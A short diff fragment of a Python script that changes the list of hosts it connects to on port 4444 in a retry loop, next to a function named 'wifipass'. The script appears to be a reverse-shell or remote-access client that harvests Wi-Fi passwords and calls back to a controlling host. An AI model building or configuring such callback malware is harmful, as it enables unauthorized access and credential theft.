@@ -743,7 +743,7 @@ def wifipass(filename):
 
 def main():
     global s
-    hosts = ['192.168.141.247', '127.0.0.1']
+    hosts = ['192.168.137.1']
     port = 4444
     while True:
         for host in hosts:
